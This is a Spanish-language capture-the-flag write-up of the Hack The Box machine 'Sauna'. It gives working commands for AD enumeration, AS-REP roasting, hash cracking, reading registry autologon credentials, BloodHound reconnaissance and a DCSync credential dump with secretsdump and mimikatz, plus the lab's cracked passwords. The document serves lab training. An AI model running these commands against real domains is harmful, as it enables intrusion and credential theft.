---
title:  "Sauna Writeup [ES] - HackTheBox"
date:   2022-02-05 13:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [easy, windows, active-directory, kerberoasting, asreproast]
image:
  src: /images/HTB/Sauna/00-banner.png
  width: 620
  height: 410
---

# Resumen

[Sauna](https://app.hackthebox.com/machines/229) es una máquina **Windows** de dificultad fácil de la plataforma de [Hack The Box](https://app.hackthebox.com/), incluye conceptos de explotación de Active Directory y enumeración básica.

Comenzaremos por encontrar usuarios potenciales a través de enumeración LDAP y WEB. Con estos, se aplicará una validación de usuarios contra kerberos para descartar los que no resulten válidos y realizar asreproast para obtener un hash, crackearlo y posteriormente obtener una consola como un usuario de bajos privlegios. Dentro del sistema, será posible enumerar y encontrar credenciales autologon para otro usuario y pivotar a él. Este usuario tendrá privilegios para ejecutar un ataque DCSync y obtener el hash del usuario Administrador, con el que será posible ingresar directamente utilizando WinRM.

![Info](/images/HTB/Sauna/01-info.png)

# Enumeración

## Rustscan - NMAP

Como siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará [Rustscan](https://github.com/RustScan/RustScan), proporcionando comandos de nmap para realizar el escaneo desde un one-liner.

* ```rustscan 10.10.10.100 -- -sC -sV | tee services.nmap```

```plaintext
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.175:53
Open 10.10.10.175:80
Open 10.10.10.175:88
Open 10.10.10.175:135
Open 10.10.10.175:139
Open 10.10.10.175:389
Open 10.10.10.175:445
Open 10.10.10.175:464
Open 10.10.10.175:593
Open 10.10.10.175:636
Open 10.10.10.175:3268
Open 10.10.10.175:3269
Open 10.10.10.175:5985
Open 10.10.10.175:9389
Open 10.10.10.175:49667
Open 10.10.10.175:49673
Open 10.10.10.175:49674
Open 10.10.10.175:49676
Open 10.10.10.175:49695

(...)

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-01-21 07:27:16Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
```
Desde el output podemos obtener que los servicios: ```LDAP```, ```RPC```, ```HTTP```, ```SMB```, ```WinRM``` y ```Kerberos``` se encuentran abiertos, los cuales son ideales para comenzar la enumeración. Adicionalmente Nmap nos indica que el dominio al cual pertenece la máquina es: ```EGOTISTICAL-BANK.LOCAL```.


## SMB

Comenzando con el servicio ```SMB```, se intenta enumerar información adicional con una autenticación de usuario *null*.

![](/images/HTB/Sauna/02-smb.png)

Como era de esperar, no es posible enumerar recursos compartidos sin credenciales válidas.

## RPC

Se intenta lo mismo con RPC sin tener éxito.

![](/images/HTB/Sauna/03-rpcclient.png)


## LDAP

Ya que aún no disponemos de credenciales dentro de la máquina, lo que se puede hacer es lanzar un script de enumeración de **nmap** para intentar obtener algo de información.

```bash
nmap -n -sV --script "ldap* and not brute" 10.10.10.175
```
![](/images/HTB/Sauna/05-ldap.png)

Con este método se identifica el usuario **Hugo Smith** como un usuario válido del sistema.


## Enumeración Web

Con respecto al puerto 80, lo primero que se visualiza al entrar es una presunta landpage de un banco llamado **Egotistical Bank**


![](/images/HTB/Sauna/10-web.png)


Husmeando por la web, llegamos a la ruta ```/about``` en donde hay nombres de "colaboradores", los cuales son usuarios potenciales del sistema.

![](/images/HTB/Sauna/15-about-page.png)

Se obtienen los siguientes nombres:

* Fergus Smith
* Hugo Bear
* Steven Kerb
* Shaun Coins
* Bowie Taylor
* Sophie Driver

En este punto, podemos utilizar la herramienta [Kerbrute](https://github.com/ropnop/kerbrute) para validar estos usuarios. Pero antes de esto, sería importante saber en qué formato están creados los usuarios dentro del dominio, es decir, su **samAccountName** o nombre de login. Tomaremos como ejemplo el primer usuario obtenido, **Hugo Smith** e intentaremos distintos formatos para conocer la estructura.


Ejecutaremos kerbrute con la siguiente lista de usuarios para conocer el formato.

```plaintext
hugo_smith
hugo.smith
hugosmith
hugo-smith
hsmith
```

```kerbrute userenum users.txt --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL```

![](/images/HTB/Sauna/20-kerbrute.png)

Y tenemos un match con el usuario **hsmith**, con esto ya podemos construir la lista con el resto de nombres.

```plaintext
hsmith
fsmith
hbear
skerb
scoins
btaylor
sdriver
```

# ASREPRoast

Con la información obtenida, se podría intentar un ataque de tipo AS-REP Roast, el cual consiste en abusar del atributo ```DONT_REQ_PREAUTH``` en la configuración del usuario, de esta forma obtendremos un TGT o hash que es posible crackear de manera offline con **john the ripper** o **hashcat**.

> [Fuente](https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html) 

Para realizar este ataque existen varias opciones, en este caso estaremos utilizando **GetNPUsers.py** de [Impacket](https://github.com/SecureAuthCorp/impacket) y el módulo **ASREPROAST** de [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). 

## GetNPUsers

* ```GetNPUsers.py -usersfile users.txt -no-pass -request EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175```

![](/images/HTB/Sauna/25-asreproast.png)

## CrackmapExec

* ```cme ldap 10.10.10.175 -u users.txt -p '' --asreproast hashes.txt --kdcHost 10.10.10.175```

![](/images/HTB/Sauna/28-asreproast-cme.png)

De todos los usuarios en la lista, solo el user **fsmith** es vulnerable a **asreproast** y se obtiene su hash.

# Ganando Acceso - user fsmith

Ambos hashes serán válidos y podrán ser crackeados por ambas herramientas mencionadas anteriormente. En esta ocasión utilizaremos **hashcat**.

Para descubrir que módo se debe utilizar, podemos listar los hashes de ejemplo con ```--example-hashes``` y filtrar por la cadena de inicio del hash.

![](/images/HTB/Sauna/30-hashcat.png)

Ahora, consultando el panel de ayuda ```hashcat -h``` vemos un ejemplo de ejecución utilizando un wordlist.

![](/images/HTB/Sauna/35-hashcat-help.png)

Entonces tendríamos lo siguiente:

* ```hashcat -a 0 -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt```

![](/images/HTB/Sauna/40-hascat-cracked.png)

Se consigue la contraseña ```Thestrokes23```. Inmeditanamente la validamos contra el servicio **WinRM** y tenemos acceso.

![](/images/HTB/Sauna/48-winrm-check.png)

# Escalando privilegios - user svc_loanmgr

Ya una vez dentro de **Sauna**, procederemos a realizar enumeración básica y con ```net users``` se descubre un nuevo usuario: ```svc_loanmgr```.

![](/images/HTB/Sauna/44-net-users.png)

Esto también puede ser enumerado con la ayuda de CrackMapExec haciendo un bruteforcing de usuarios en base a su ```RID```.

![](/images/HTB/Sauna/45-rid-brute.png)

Continuando, pasamos a buscar credenciales que pudieran estar guardadas en el registro, es decir, contraseñas autologon. Esto se puede realizar con una query desde consola o bien utilizando [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

* ```reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"```

![](/images/HTB/Sauna/60-autologon-creds.png)

Se obtiene la contraseña para el usuario ```svc_loanmgr```. Al chequear las credenciales contra el servicio WinRM, vemos que también se encuentra en el grupo **Remote Management Users**.

![](/images/HTB/Sauna/65-winrm-check-svc.png)

# Escalando privilegios - root

Ahora que tenemos acceso al user ```svc_loanmgr``` aplicaremos un reconocimiento con la ayuda de bloodhound. Para esta ocasión se utilizará la [versión en python](https://github.com/fox-it/BloodHound.py) que se puede lanzar remotamente.

## Bloodhound

* ```bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c all```

![](/images/HTB/Sauna/50-bloodhound-python.png)

Se obtienen cuatro archivos con la información extraída y procederemos a subirlos a **BloodHound**

![](/images/HTB/Sauna/55-bloodhound-files.png)

> Información adicional sobre bloodhound: [Hacktricks](https://book.hacktricks.xyz/windows/active-directory-methodology/bloodhound) 

Una vez la data ha sido importada, buscaremos entidades con permisos para ejecutar un ataque **DCSync**.

> Más información sobre DCSync y su explotación: [HackTricks](https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync)

Desde la pestaña **Analysis** seleccionaremos *Find Principals with DCSync Rights*, esto automáticamente nos dará una lista de los usuarios/grupos que tengan los permisos necesarios para aplicar el ataque.

![](/images/HTB/Sauna/68-bloodhound-analysis.png)

El user **svc_loanmgr** posee los permisos ```GetChanges``` y ```GetChangesAll```.

![](/images/HTB/Sauna/70-bloodhound-dscync.png)


## DCSync

### Secretsdump

Con esta información, ya se puede realizar el **DCSync** remotamente utilizando ```secretsdump.py``` de **impacket**.

* ```secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175```

![](/images/HTB/Sauna/75-secretsdump.png)


### Mimikatz

Otra forma de aplicar **DCSync** (localmente), sería subir a la máquina el binario de ```mimikatz.exe``` y ejecutar la siguiente instrucción.

* ```.\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit```

![](/images/HTB/Sauna/78-mimikatz.png)


Con el **hash** del usuario ```Administrador``` obtenido, intentaremos ingresar por **WinRM** directamente, ya que no es necesario crackearlo.

![](/images/HTB/Sauna/80-winrm-admin.png)

Por último, listaremos las flags.

![](/images/HTB/Sauna/85-flags.png)

![](/images/HTB/Sauna/100-pwned.png)

> ¡Happy Hacking and keep grinding!